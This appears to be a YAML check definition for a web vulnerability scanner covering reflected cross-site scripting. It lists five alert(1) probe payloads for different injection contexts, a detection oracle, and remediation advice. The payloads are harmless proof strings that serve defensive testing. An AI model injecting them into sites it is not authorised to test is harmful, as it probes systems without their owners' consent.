id: xss-reflected
name: Reflected Cross-Site Scripting (XSS)
family: xss
severity: high
cwe: CWE-79
owasp: WSTG-INPV-01
cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
inject_into: [query, body, json]
payloads:
  - "<script>alert(1)</script>"
  - "\"><svg onload=alert(1)>"          # attribute breakout -> new tag
  - "'-alert(1)-'"                        # JS string context breakout
  - "<img src=x onerror=alert(1)>"       # event-handler context
  - "javascript:alert(1)"                # href/src sink context
oracle:
  type: any_of
  checks:
    - type: reflected_xss   # context-aware: only fires on an *executable* reflection
confirm_reproducible: true
remediation: >-
  HTML-encode all user input before rendering it into HTML (contextual output
  encoding). Prefer a templating engine with autoescaping enabled, and add a
  Content-Security-Policy as defense in depth.
